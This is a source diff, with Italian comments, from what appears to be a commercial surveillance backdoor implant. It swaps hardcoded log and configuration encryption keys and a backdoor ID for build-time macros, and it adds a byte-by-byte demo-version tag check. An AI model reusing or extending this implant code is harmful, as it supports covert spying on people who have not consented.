@@ -46,6 +46,7 @@
 #include "status_log.h"
 
 #pragma bss_seg("shared")
+BOOL is_demo_version;
 BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
 BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf
 
@@ -111,11 +112,11 @@ void UnlockConfFile();
 #include "HM_Contacts.h" // XXX da modificare
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
-BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
+BYTE bin_patched_key[KEY_LEN*2] = ENCRYPTION_KEY;
 // Qui finira' il binary patch con la chiave di cifratura per la conf
-BYTE bin_patched_key_conf[KEY_LEN] = "ngkdNGKDh4H4869";
+BYTE bin_patched_key_conf[KEY_LEN*2] = ENCRYPTION_KEY_CONF;
 
-BYTE bin_patched_backdoor_id[] = "RCS_0000000691";
+BYTE bin_patched_backdoor_id[] = BACKDOOR_ID;
 
 // Variabili di configurazione globali
 nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
@@ -1295,6 +1296,40 @@ DWORD HM_CreateProcessThread(void *dummy)
 	return 1;
 }
 
+BOOL CheckDemoVersion()
+{
+	char demo_tag[24];
+
+	memcpy(demo_tag, DEMO_TAG , sizeof(demo_tag));
+
+	if (demo_tag[0] != 'h') return FALSE;
+	if (demo_tag[1] != 'x') return FALSE;
+	if (demo_tag[2] != 'V') return FALSE;
+	if (demo_tag[3] != 't') return FALSE;
+	if (demo_tag[4] != 'd') return FALSE;
+	if (demo_tag[5] != 'x') return FALSE;
+	if (demo_tag[6] != 'J') return FALSE;
+	if (demo_tag[7] != '/') return FALSE;
+	if (demo_tag[8] != 'Z') return FALSE;
+	if (demo_tag[9] != '8') return FALSE;
+	if (demo_tag[10] != 'L') return FALSE;
+	if (demo_tag[11] != 'v') return FALSE;
+	if (demo_tag[12] != 'K') return FALSE;
+	if (demo_tag[13] != '3') return FALSE;
+	if (demo_tag[14] != 'U') return FALSE;
+	if (demo_tag[15] != 'L') return FALSE;
+	if (demo_tag[16] != 'S') return FALSE;
+	if (demo_tag[17] != 'n') return FALSE;
+	if (demo_tag[18] != 'K') return FALSE;
+	if (demo_tag[19] != 'R') return FALSE;
+	if (demo_tag[20] != 'U') return FALSE;
+	if (demo_tag[21] != 'm') return FALSE;
+	if (demo_tag[22] != 'L') return FALSE;
+	if (demo_tag[23] != 'E') return FALSE;
+
+	return TRUE;
+}
+
 //Riempie i campi relativi al nome del file immagine,
 //file di configurazione, directory di installazione.
 //Se torna FALSE non chiude niente, tanto il processo
@@ -1305,6 +1340,9 @@ BOOL HM_GuessNames()
 	char neutral_name[MAX_RAND_NAME];
 	char *ptr_offset;
 	
+	// Verifica se si tratta della versione demo o meno
+	is_demo_version = CheckDemoVersion();
+
 	if (!FindModulePath(path_name, sizeof(path_name)))
 		return FALSE;
 
